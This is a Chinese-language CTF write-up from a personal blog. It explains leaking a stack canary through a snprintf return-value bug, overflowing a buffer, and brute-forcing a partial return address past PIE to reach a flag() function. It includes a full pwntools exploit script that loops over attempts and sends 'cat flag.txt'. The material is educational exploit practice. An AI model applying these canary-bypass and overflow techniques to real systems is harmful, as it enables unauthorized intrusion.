<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>canary绕过与ROP.md | ScUpax0s</title><meta name="description" content="0x01 考查知识点 Canary的泄露与绕过 开启PIE后地址的确定0x02 程序概览 我们先读了一个255到recvbuf，注意这里的recvbuf是一个bss段上的变量（未初始化全局），不是在栈上。然后从&amp;recvbuf拷贝256个字节到&amp;s，这里我们第一次的输入就被放到栈上了（因为s在栈上）。接下来使用write将s输出，这里可以用来泄露Canary。接下来他有读取了512"><meta name="keywords" content="Canary &amp;&amp; PIE"><meta name="author" content="Paxos"><meta name="copyright" content="Paxos"><meta name="format-detection" content="telephone=no"><link rel="shortcut icon" href="/img/favicon.png"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="dns-prefetch" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="https://fonts.googleapis.com" crossorigin="crossorigin"/><link rel="dns-prefetch" href="https://fonts.googleapis.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="dns-prefetch" href="//busuanzi.ibruce.info"/><meta name="twitter:card" content="summary"><meta name="twitter:title" content="canary绕过与ROP.md"><meta name="twitter:description" content="0x01 考查知识点 Canary的泄露与绕过 开启PIE后地址的确定0x02 程序概览 我们先读了一个255到recvbuf，注意这里的recvbuf是一个bss段上的变量（未初始化全局），不是在栈上。然后从&amp;recvbuf拷贝256个字节到&amp;s，这里我们第一次的输入就被放到栈上了（因为s在栈上）。接下来使用write将s输出，这里可以用来泄露Canary。接下来他有读取了512"><meta name="twitter:image" content="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg"><meta property="og:type" content="article"><meta property="og:title" content="canary绕过与ROP.md"><meta property="og:url" content="http://yoursite.com/2020/05/13/canary%E7%BB%95%E8%BF%87%E4%B8%8EROP-md/"><meta property="og:site_name" content="ScUpax0s"><meta property="og:description" content="0x01 考查知识点 Canary的泄露与绕过 开启PIE后地址的确定0x02 程序概览 我们先读了一个255到recvbuf，注意这里的recvbuf是一个bss段上的变量（未初始化全局），不是在栈上。然后从&amp;recvbuf拷贝256个字节到&amp;s，这里我们第一次的输入就被放到栈上了（因为s在栈上）。接下来使用write将s输出，这里可以用来泄露Canary。接下来他有读取了512"><meta property="og:image" content="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg"><meta property="article:published_time" content="2020-05-12T16:32:14.000Z"><meta property="article:modified_time" content="2020-05-12T18:30:10.741Z"><script src="https://cdn.jsdelivr.net/npm/js-cookie/dist/js.cookie.min.js"></script><script>var autoChangeMode = '1'
var t = Cookies.get("theme")
if (autoChangeMode == '1'){
  var isDarkMode = window.matchMedia("(prefers-color-scheme: dark)").matches
  var isLightMode = window.matchMedia("(prefers-color-scheme: light)").matches
  var isNotSpecified = window.matchMedia("(prefers-color-scheme: no-preference)").matches
  var hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

  if (t === undefined){
    if (isLightMode) activateLightMode()
    else if (isDarkMode) activateDarkMode()
    else if (isNotSpecified || hasNoSupport){
      console.log('You specified no preference for a color scheme or your browser does not support it. I Schedule dark mode during night time.')
      var now = new Date()
      var hour = now.getHours()
      var isNight = hour < 6 || hour >= 18
      isNight ? activateDarkMode() : activateLightMode()
  }
  } else if (t == 'light') activateLightMode()
  else activateDarkMode()

} else if (autoChangeMode == '2'){
  now = new Date();
  hour = now.getHours();
  isNight = hour < 6 || hour >= 18
  if(t === undefined) isNight? activateDarkMode() : activateLightMode()
  else if (t === 'light') activateLightMode()
  else activateDarkMode() 
} else {
  if ( t == 'dark' ) activateDarkMode()
  else if ( t == 'light') activateLightMode()
}

function activateDarkMode(){
  document.documentElement.setAttribute('data-theme', 'dark')
  if (document.querySelector('meta[name="theme-color"]') !== null){
    document.querySelector('meta[name="theme-color"]').setAttribute('content','#000')
  }
}
function activateLightMode(){
  document.documentElement.setAttribute('data-theme', 'light')
  if (document.querySelector('meta[name="theme-color"]') !== null){
  document.querySelector('meta[name="theme-color"]').setAttribute('content','#fff')
  }
}</script><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><link rel="canonical" href="http://yoursite.com/2020/05/13/canary%E7%BB%95%E8%BF%87%E4%B8%8EROP-md/"><link rel="prev" title="从网鼎杯白虎组pwn（云盾）学习UAF与fastbin attack" href="http://yoursite.com/2020/05/21/%E4%BB%8E%E7%BD%91%E9%BC%8E%E6%9D%AF%E7%99%BD%E8%99%8E%E7%BB%84pwn%EF%BC%88%E4%BA%91%E7%9B%BE%EF%BC%89%E5%AD%A6%E4%B9%A0UAF%E4%B8%8Efastbin-attack/"><link rel="next" title="从一道菜单题锻炼pwn中的堆技能" href="http://yoursite.com/2020/05/09/%E4%BB%8E%E4%B8%80%E9%81%93%E8%8F%9C%E5%8D%95%E9%A2%98%E9%94%BB%E7%82%BCpwn%E4%B8%AD%E7%9A%84%E5%A0%86%E6%8A%80%E8%83%BD/"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: {"defaultEncoding":2,"translateDelay":0,"cookieDomain":"https://xxx/","msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  bookmark: {
    message_prev: 'Press',
    message_next: 'to bookmark this page'
  },
  runtime_unit: 'days',
  runtime: true,
  copyright: undefined,
  ClickShowText: undefined,
  medium_zoom: false,
  fancybox: true,
  Snackbar: undefined,
  baiduPush: false,
  highlightCopy: true,
  highlightLang: true,
  highlightShrink: 'false',
  isFontAwesomeV5: false,
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: false
  
}</script><script>var GLOBAL_CONFIG_SITE = { 
  isPost: true,
  isHome: false,
  isSidebar: true  
  }</script><noscript><style>
#page-header {
  opacity: 1
}
.justified-gallery img{
  opacity: 1
}
</style></noscript><meta name="generator" content="Hexo 4.2.0"></head><body><div id="mobile-sidebar"><div id="menu_mask"></div><div id="mobile-sidebar-menus"><div class="mobile_author_icon"><img class="avatar-img" src="https://s1.ax1x.com/2020/06/15/N9ZTBV.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="mobile_post_data"><div class="mobile_data_item is-center"><div class="mobile_data_link"><a href="/archives/"><div class="headline">Articles</div><div class="length_num">70</div></a></div></div><div class="mobile_data_item is-center">      <div class="mobile_data_link"><a href="/tags/"><div class="headline">Tags</div><div class="length_num">34</div></a></div></div><div class="mobile_data_item is-center">     <div class="mobile_data_link"><a href="/categories/"><div class="headline">Categories</div><div class="length_num">14</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page"><i class="fa-fw fa fa-diamond" aria-hidden="true"></i><span> Life</span><i class="fa fa-chevron-down menus-expand" aria-hidden="true"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/artitalk/"><i class="fa-fw fa fa-comments-o"></i><span> talk</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-heart"></i><span> About</span></a></div><div class="menus_item"><a class="site-page"><i class="fa-fw fa fa-list" aria-hidden="true"></i><span> List</span><i class="fa fa-chevron-down menus-expand" aria-hidden="true"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fa fa-music"></i><span> Music</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fa fa-film"></i><span> Movie</span></a></li></ul></div></div></div></div><i class="fa fa-arrow-right on" id="toggle-sidebar" aria-hidden="true">     </i><div id="sidebar"><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar">     </div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-考查知识点"><span class="toc-number">1.</span> <span class="toc-text">0x01 考查知识点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-程序概览"><span class="toc-number">2.</span> <span class="toc-text">0x02 程序概览</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-攻击思路"><span class="toc-number">3.</span> <span class="toc-text">0x03 攻击思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-攻击过程"><span class="toc-number">4.</span> <span class="toc-text">0x04 攻击过程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-exp"><span class="toc-number">5.</span> <span class="toc-text">0x05 exp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-相关知识补充"><span class="toc-number">6.</span> <span class="toc-text">0x06 相关知识补充</span></a></li></ol></div></div></div><div id="body-wrap"><div class="post-bg" id="nav" style="background-image: url(https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg)"><div id="page-header"><span class="pull_left" id="blog_name"><a class="blog_title" id="site-name" href="/">ScUpax0s</a></span><span class="pull_right menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page"><i class="fa-fw fa fa-diamond" aria-hidden="true"></i><span> Life</span><i class="fa fa-chevron-down menus-expand" aria-hidden="true"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/artitalk/"><i class="fa-fw fa fa-comments-o"></i><span> talk</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-heart"></i><span> About</span></a></div><div class="menus_item"><a class="site-page"><i class="fa-fw fa fa-list" aria-hidden="true"></i><span> List</span><i class="fa fa-chevron-down menus-expand" aria-hidden="true"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fa fa-music"></i><span> Music</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fa fa-film"></i><span> Movie</span></a></li></ul></div></div><span class="toggle-menu close"><a class="site-page"><i class="fa fa-bars fa-fw" aria-hidden="true"></i></a></span></span></div><div id="post-info"><div id="post-title"><div class="posttitle">canary绕过与ROP.md</div></div><div id="post-meta"><div class="meta-firstline"><time class="post-meta__date"><span class="post-meta__date-created" title="Created 2020-05-13 00:32:14"><i class="fa fa-calendar" aria-hidden="true"></i> Created 2020-05-13</span><span class="post-meta__separator">|</span><span class="post-meta__date-updated" title="Updated 2020-05-13 02:30:10"><i class="fa fa-history" aria-hidden="true"></i> Updated 2020-05-13</span></time><span class="post-meta__categories"><span class="post-meta__separator">|</span><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/CTF/">CTF</a></span></div><div class="meta-secondline"> </div><div class="meta-thirdline"><span class="post-meta-pv-cv"><i class="fa fa-eye post-meta__icon" aria-hidden="true"> </i><span>Post View:</span><span id="busuanzi_value_page_pv"></span></span><span class="post-meta-commentcount"><span class="post-meta__separator">|</span><i class="post-meta__icon fa fa-comment-o" aria-hidden="true"></i><span>Comments:</span><span class="disqus-comment-count comment-count"><a href="http://yoursite.com/2020/05/13/canary%E7%BB%95%E8%BF%87%E4%B8%8EROP-md/#disqus_thread"></a></span></span></div></div></div></div><main class="layout_post" id="content-inner"><article id="post"><div class="post-content" id="article-container"><h2 id="0x01-考查知识点"><a href="#0x01-考查知识点" class="headerlink" title="0x01 考查知识点"></a>0x01 考查知识点</h2><ul>
<li>Canary的泄露与绕过</li>
<li>开启PIE后地址的确定<h2 id="0x02-程序概览"><a href="#0x02-程序概览" class="headerlink" title="0x02 程序概览"></a>0x02 程序概览</h2></li>
<li>我们先读了一个255到recvbuf，注意这里的recvbuf是一个bss段上的变量（未初始化全局），不是在栈上。然后从&amp;recvbuf拷贝256个字节到&amp;s，这里我们第一次的输入就被放到栈上了（因为s在栈上）。接下来使用write将s输出，这里可以用来泄露Canary。接下来他有读取了512字节，<strong>注意，这里很重要，第一次读取了255；第二次读取了512</strong>，然后又将栈上内容输出。<img src="https://s1.ax1x.com/2020/05/13/YUc7ut.png" alt=""></li>
</ul>
<ul>
<li>看一下程序的保护,保护全开。<img src="https://s1.ax1x.com/2020/05/13/YUglVK.png" alt="">)<img src="https://s1.ax1x.com/2020/05/13/YU2dSJ.png" alt=""></li>
<li>那这个程序其实利用点就很明显了，Got表不可写，地址随机化+Canary。。。万幸我们发现了程序中的<code>flag()</code>函数，这个函数可以直接pwn，所以目标就是ROP到<code>flag()</code>函数。<img src="https://s1.ax1x.com/2020/05/13/YUgY2d.png" alt=""></li>
</ul>
<h2 id="0x03-攻击思路"><a href="#0x03-攻击思路" class="headerlink" title="0x03 攻击思路"></a>0x03 攻击思路</h2><ul>
<li>首先，这是一个带Canary的程序，我们必须先拿到Canary，我们选择在第一个二write处泄漏Canary，此时的write输出时会将Canary的值带出来。</li>
<li>当我们拿到Canary以后，进入第二个read，<code>padding + p64(Canary) + &#39;a&#39;*8 + flag_address</code>这就是我们的payload，实际就是把Canary拼进我们的payload，<strong>将栈上原本是Canary的地方覆盖为Canary</strong>（可能这句话有些奇怪，但是意思应该很好理解，就是保持Canary不变，防止触发stack smashing），接下来填充8字节垃圾值，到达返回地址，我们将放回地址覆盖为<code>flag()</code>函数的地址就好。</li>
<li>在覆盖地址的时候，经过我的观察，我们的目标地址，与他原本的返回地址直接，<strong>只有最后两个字节不一样，所以由于PIE，我们只用爆破最后两个字节就可以了，其实只用爆破一个字节，pie最多影响到0x1000，这个爆破量很低</strong><img src="https://s1.ax1x.com/2020/05/13/YU2FsI.png" alt="">)经过观察，原本返回地址的后三位0x2ff,我们目标返回的<code>flag()</code>后三位：0x185,所以最后一个字节我们直接拿<code>\x85</code>覆盖掉，倒数第二个字节我们爆破。</li>
</ul>
<h2 id="0x04-攻击过程"><a href="#0x04-攻击过程" class="headerlink" title="0x04 攻击过程"></a>0x04 攻击过程</h2><ul>
<li>首先我们把Canary泄漏出来。首先我们构造254个’a’然后sendline,这个时候write会把Cananry带出来，当然，被带出来的不只有Canary，还有一些我们不需要的值。不过这里有一个坑，在我们第一次read的时候，我们最多只能read进来255个字节的内容，这实际上跟Canary是有一个距离的，所以导致我们在接收返回时要丢掉这些垃圾值才接收到Canary<img src="https://s1.ax1x.com/2020/05/13/YURMtO.png" alt="">  <figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">"a"</span>*<span class="number">254</span></span><br><span class="line">io.recvuntil(<span class="string">"say something~\n"</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvuntil(<span class="string">"You say: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"</span>)</span><br><span class="line">canary = u64(io.recv(<span class="number">7</span>).rjust(<span class="number">8</span>,<span class="string">"\x00"</span>))</span><br><span class="line"><span class="string">"""解释一下最后一行，由于我们接受了十个\x00。此时我们不仅接收到了8个垃圾\x00以及一个我们由于输入长度不够未填充到的\x00，还有一个Cananry的\x00也被我们接收过滤了，所以我们再接7个字节，这就是除了最低字节\x00以外的Canary的值，然后我们使用rjust给他填充到8字节，不足的\x00补全，此时就是完整的Cananry了"""</span></span><br></pre></td></tr></table></figure>
  经过我们的调试我发现在把Canary泄露出来的同时，后面有18个字节的垃圾值也被泄漏出来的，所以我们再加一个<code>io.recv(18)</code>来过滤掉Canary后的18个字节垃圾值。以免影响后面的过程。</li>
<li>在我们拿到Canary后，就可以拼入第二个read的payload里了，此时使用第二个read做溢出来覆盖返回地址，<strong>因为第二个read读进来512个字节，完全能够满足溢出的长度，不像第一个read覆盖不到。</strong>  <figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">io.recv(<span class="number">18</span>)</span><br><span class="line">p2 = flat(<span class="string">'a'</span>*<span class="number">264</span>,p64(canary) ,<span class="string">"p"</span>*<span class="number">8</span>*<span class="number">1</span> , <span class="string">"\x85"</span> , <span class="string">"\xf1"</span>)   <span class="comment"># canary拼进去，此时就不会由于Cnanary被破坏导致stack smashing，'p'*8是为了覆盖在Canary和ret之间的s</span></span><br><span class="line">io.send(p2)</span><br></pre></td></tr></table></figure>
  <img src="https://s1.ax1x.com/2020/05/13/YURrcj.png" alt=""></li>
<li>接下来就是ret地址的问题了，因为我们只需要爆破一个字节（其实是半个字节），我们打一个while(1)循环直接爆就行，这块没什么技术含量。可以看到在p2中我们最后是这样写的<code>\x85 + \xf1</code>，这个85是确定的，而0xf1中f是被PIE随机化的，其实我们只需要爆这半个字节。</li>
</ul>
<h2 id="0x05-exp"><a href="#0x05-exp" class="headerlink" title="0x05 exp"></a>0x05 exp</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding='utf-8'</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line">context.terminal=<span class="string">'/bin/zsh'</span></span><br><span class="line">elf = ELF(<span class="string">""</span>)</span><br><span class="line"><span class="comment">#io = process("./a.out")</span></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        io = process(<span class="string">""</span>)</span><br><span class="line">        payload = <span class="string">"a"</span>*<span class="number">254</span></span><br><span class="line">        io.recvuntil(<span class="string">"say something~\n"</span>)</span><br><span class="line">        io.sendline(payload)</span><br><span class="line">        io.recvuntil(<span class="string">"You say: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"</span>)</span><br><span class="line">        canary = u64(io.recv(<span class="number">7</span>).rjust(<span class="number">8</span>,<span class="string">"\x00"</span>))</span><br><span class="line">        log.info(hex(canary))</span><br><span class="line">        io.recv(<span class="number">18</span>)</span><br><span class="line">        p2 = flat(<span class="string">'a'</span>*<span class="number">264</span>,p64(canary) ,<span class="string">"p"</span>*<span class="number">8</span>*<span class="number">1</span> , <span class="string">"\x85"</span> , <span class="string">"\xf1"</span>)   <span class="comment"># canary</span></span><br><span class="line">        io.send(p2)</span><br><span class="line">        sleep(<span class="number">0.2</span>)</span><br><span class="line">        io.recv()</span><br><span class="line">        io.sendline(<span class="string">"cat flag.txt"</span>)</span><br><span class="line">        io.recv()</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"error ret"</span></span><br></pre></td></tr></table></figure>

<h2 id="0x06-相关知识补充"><a href="#0x06-相关知识补充" class="headerlink" title="0x06 相关知识补充"></a>0x06 相关知识补充</h2><p><a href="https://wiki.x10sec.org/pwn/mitigation/Canary/#1canary" target="_blank" rel="noopener">CTFWIKI_Canary</a></p>
<ul>
<li>不知道大家有没有发现一个问题，关于snprintf函数，为什么我们的write能泄露出Canary？？明明我们只读入了255个字节，snprintf也只是拷贝了256个字节。这牵扯到一个snprintf的问题。<img src="https://s1.ax1x.com/2020/05/13/YUW0Vx.png" alt=""></li>
<li>请看官方手册内容：</li>
</ul>
<p><em>The functions snprintf() and vsnprintf() do not  write  more than size bytes (including the trailing ’\0’). If the output was truncated due to this limit then the return value is the number of  characters (not including the trailing ’\0’) which would have been written to the final string if enough space had been  available.  Thus,  a  return value  of  size  or more means that the output was truncated.</em></p>
<ul>
<li>这段话信息量很大，总结一下就是<strong>如果输出因为size的限制而被截断，返回值将是“如果有足够空间存储，所应能输出的字符数(不包括字符串结尾的’\0’)”，这个值和size相等或者比size大！也就是说，如果可以写入的字符串是”0123456789ABCDEF”共16位，但是size限制了是10，这样 snprintf() 的返回值将会是16 而不是10！</strong><img src="https://s1.ax1x.com/2020/05/13/YUfWpF.png" alt="">这个过程就很明显了，首先recvbuf放入%s然后和那一串“You say…..”一起放进&amp;s里，<strong>此时size=256，造成截断，返回值大于256！！更通俗来说，在此时snprintf的返回值是：“欲写入的size”，而不是“实际写入的size”</strong>，于是造成了v0 &gt; 256 ，最终让我们达到了泄露Canary的目的。</li>
</ul>
</div><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">Paxos</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://yoursite.com/2020/05/13/canary%E7%BB%95%E8%BF%87%E4%B8%8EROP-md/">http://yoursite.com/2020/05/13/canary%E7%BB%95%E8%BF%87%E4%B8%8EROP-md/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Canary-PIE/">Canary &amp;&amp; PIE</a></div><div class="post_share"><div class="social-share" data-image="https://s3.ax1x.com/2021/01/06/sAsCKU.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"/><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js"></script></div></div><div class="post-reward"><a class="reward-button button--primary button--animated"> <i class="fa fa-qrcode"></i> Donate<div class="reward-main"><ul class="reward-all"><li class="reward-item"><img class="post-qr-code__img" src="/img/wechat.jpg" alt="微信"/><div class="post-qr-code__desc">微信</div></li><li class="reward-item"><img class="post-qr-code__img" src="/img/alipay.jpg" alt="支付寶"/><div class="post-qr-code__desc">支付寶</div></li></ul></div></a></div><nav class="pagination_post" id="pagination"><div class="prev-post pull_left"><a href="/2020/05/21/%E4%BB%8E%E7%BD%91%E9%BC%8E%E6%9D%AF%E7%99%BD%E8%99%8E%E7%BB%84pwn%EF%BC%88%E4%BA%91%E7%9B%BE%EF%BC%89%E5%AD%A6%E4%B9%A0UAF%E4%B8%8Efastbin-attack/"><img class="prev_cover" src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">从网鼎杯白虎组pwn（云盾）学习UAF与fastbin attack</div></div></a></div><div class="next-post pull_right"><a href="/2020/05/09/%E4%BB%8E%E4%B8%80%E9%81%93%E8%8F%9C%E5%8D%95%E9%A2%98%E9%94%BB%E7%82%BCpwn%E4%B8%AD%E7%9A%84%E5%A0%86%E6%8A%80%E8%83%BD/"><img class="next_cover" src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">从一道菜单题锻炼pwn中的堆技能</div></div></a></div></nav><hr><div id="post-comment"><div class="comment_headling"><i class="fa fa-comments fa-fw" aria-hidden="true"></i><span> Comment</span></div><div id="disqus_thread"></div><script>var disqus_config = function () {
  this.page.url = 'http://yoursite.com/2020/05/13/canary%E7%BB%95%E8%BF%87%E4%B8%8EROP-md/';
  this.page.identifier = '2020/05/13/canary绕过与ROP-md/';
  this.page.title = 'canary绕过与ROP.md';
};
(function() { 
  var d = document, s = d.createElement('script');
  s.src = 'https://ScUpax0s.disqus.com/embed.js';
  s.setAttribute('data-timestamp', +new Date());
  (d.head || d.body).appendChild(s);
})();
</script><script>function getDisqusCount() {
  var d = document, s = d.createElement('script');
  s.src = 'https://ScUpax0s.disqus.com/count.js';
  s.id = 'dsq-count-scr';
  (d.head || d.body).appendChild(s);
}

window.addEventListener('load', getDisqusCount, false);</script></div></article></main><footer id="footer" data-type="color"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By Paxos</div><div class="framework-info"><span>Driven </span><a href="https://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme </span><a href="https://github.com/jerryc127/hexo-theme-butterfly" target="_blank" rel="noopener"><span>Butterfly</span></a></div></div></footer></div><section class="rightside" id="rightside"><div id="rightside-config-hide"><i class="fa fa-book" id="readmode" title="Read Mode"></i><i class="fa fa-plus" id="font_plus" title="Increase font size"></i><i class="fa fa-minus" id="font_minus" title="Decrease font size"></i><a class="translate_chn_to_cht" id="translateLink" href="javascript:translatePage();" title="Traditional Chinese and Simplified Chinese Conversion" target="_self">繁</a><i class="darkmode fa fa-moon-o" id="darkmode" title="Dark Mode"></i></div><div id="rightside-config-show"><div id="rightside_config" title="Setting"><i class="fa fa-cog" aria-hidden="true"></i></div><a id="to_comment" href="#post-comment" title="Scroll to comment"><i class="scroll_to_comment fa fa-comments">  </i></a><i class="fa fa-list-ul close" id="mobile-toc-button" title="Table of Contents" aria-hidden="true"></i><i class="fa fa-arrow-up" id="go-up" title="Back to top" aria-hidden="true"></i></div></section><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page@3/instantpage.min.js" type="module"></script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body></html>